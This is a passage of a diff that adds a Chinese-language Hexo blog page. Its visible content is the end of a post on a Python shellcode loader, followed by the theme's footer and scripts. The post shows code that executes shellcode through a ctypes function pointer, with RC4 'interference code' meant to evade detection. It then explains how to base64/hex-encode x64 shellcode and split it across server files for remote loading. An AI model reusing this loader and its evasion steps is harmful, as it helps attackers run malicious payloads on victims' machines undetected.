CFUNCTYPE(c_void_p))<span class="comment"># 创建 shellcode 的函数指针</span></span><br><span class="line">fuck=rc4(GenPassword(<span class="number">7</span>),<span class="string">&#x27;encode&#x27;</span>,GenPassword(<span class="number">13</span>))<span class="comment"># 干扰代码</span></span><br><span class="line">runcode()<span class="comment"># 执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这份代码远程加载编码过的shellcode,并做了干扰,<br>需要先生成x64的python shellcode(和上面一样),然后用这段代码进行编码,按顺序分成3断存在服务器文件中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#				这里放shellcode👇</span></span><br><span class="line">b64 = base64.b64encode(<span class="string">b&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc8\......shellcode&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> b64.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2f4569443550446f7941414141454652515642535556..............</span></span><br></pre></td></tr></table></figure>
+<p>把得到的字符存储到服务器文件中<br><img src="image-20210512171407264.png" alt="image-20210512171407264"></p>
+
+            
+        </div>
+        <div class="page-template-comments">
+            
+        </div>
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">This_is_Y</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
